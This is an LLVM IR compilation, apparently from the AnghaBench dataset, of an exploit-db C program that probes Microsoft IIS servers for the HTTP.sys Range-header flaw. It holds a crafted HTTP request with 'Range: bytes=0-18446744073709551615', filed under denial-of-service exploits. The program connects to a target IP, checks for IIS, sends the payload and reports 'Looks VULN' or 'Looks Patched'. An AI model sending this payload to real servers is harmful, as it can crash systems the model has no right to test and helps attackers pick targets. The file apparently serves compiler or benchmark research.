; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_36773.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_36773.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.request = private unnamed_addr constant [19 x i8] c"GET / HTTP/1.0\0D\0A\0D\0A\00", align 16
@__const.main.request1 = private unnamed_addr constant [69 x i8] c"GET / HTTP/1.1\0D\0AHost: stuff\0D\0ARange: bytes=0-18446744073709551615\0D\0A\0D\0A\00", align 16
@.str = private unnamed_addr constant [29 x i8] c"\0A Usage: %s <ip of server> \0A\00", align 1
@.str.1 = private unnamed_addr constant [19 x i8] c"[*] Audit Started\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"Microsoft\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"[*] NOT IIS\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"Requested Range Not Satisfiable\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"[!!] Looks VULN\0A\00", align 1
@.str.6 = private unnamed_addr constant [39 x i8] c"The request has an invalid header name\00", align 1
@.str.7 = private unnamed_addr constant [18 x i8] c"[*] Looks Patched\00", align 1
@.str.8 = private unnamed_addr constant [53 x i8] c"[*] Unexpected response, cannot discern patch status\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [1024 x i8], align 16
  %9 = alloca [19 x i8], align 16
  %10 = alloca [69 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  %11 = bitcast [19 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %11, i8* align 16 getelementptr inbounds ([19 x i8], [19 x i8]* @__const.main.request, i32 0, i32 0), i64 19, i1 false)
  %12 = bitcast [69 x i8]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([69 x i8], [69 x i8]* @__const.main.request1, i32 0, i32 0), i64 69, i1 false)
  %13 = load i32, i32* %4, align 4
  %14 = icmp ne i32 %13, 2
  br i1 %14, label %15, label %20

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0), i8* %18)
  store i32 1, i32* %3, align 4
  br label %68

20:                                               ; preds = %2
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0))
  %22 = load i8**, i8*** %5, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 1
  %24 = load i8*, i8** %23, align 8
  %25 = call i32 @connect_to_server(i8* %24)
  store i32 %25, i32* %7, align 4
  %26 = load i32, i32* %7, align 4
  %27 = getelementptr inbounds [19 x i8], [19 x i8]* %9, i64 0, i64 0
  %28 = getelementptr inbounds [19 x i8], [19 x i8]* %9, i64 0, i64 0
  %29 = call i32 @strlen(i8* %28)
  %30 = call i32 @write(i32 %26, i8* %27, i32 %29)
  %31 = load i32, i32* %7, align 4
  %32 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %33 = call i32 @read(i32 %31, i8* %32, i32 1023)
  %34 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %35 = call i64 @strstr(i8* %34, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  %36 = icmp ne i64 %35, 0
  br i1 %36, label %40, label %37

37:                                               ; preds = %20
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  %39 = call i32 @exit(i32 1) #4
  unreachable

40:                                               ; preds = %20
  %41 = load i8**, i8*** %5, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 1
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @connect_to_server(i8* %43)
  store i32 %44, i32* %7, align 4
  %45 = load i32, i32* %7, align 4
  %46 = getelementptr inbounds [69 x i8], [69 x i8]* %10, i64 0, i64 0
  %47 = getelementptr inbounds [69 x i8], [69 x i8]* %10, i64 0, i64 0
  %48 = call i32 @strlen(i8* %47)
  %49 = call i32 @write(i32 %45, i8* %46, i32 %48)
  %50 = load i32, i32* %7, align 4
  %51 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %52 = call i32 @read(i32 %50, i8* %51, i32 1023)
  %53 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %54 = call i64 @strstr(i8* %53, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0))
  %55 = icmp ne i64 %54, 0
  br i1 %55, label %56, label %59

56:                                               ; preds = %40
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  %58 = call i32 @exit(i32 1) #4
  unreachable

59:                                               ; preds = %40
  %60 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %61 = call i64 @strstr(i8* %60, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.6, i64 0, i64 0))
  %62 = icmp ne i64 %61, 0
  br i1 %62, label %63, label %65

63:                                               ; preds = %59
  %64 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.7, i64 0, i64 0))
  br label %67

65:                                               ; preds = %59
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.8, i64 0, i64 0))
  br label %67

67:                                               ; preds = %65, %63
  br label %68

68:                                               ; preds = %15, %67
  %69 = load i32, i32* %3, align 4
  ret i32 %69
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @connect_to_server(i8*) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i64 @strstr(i8*, i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
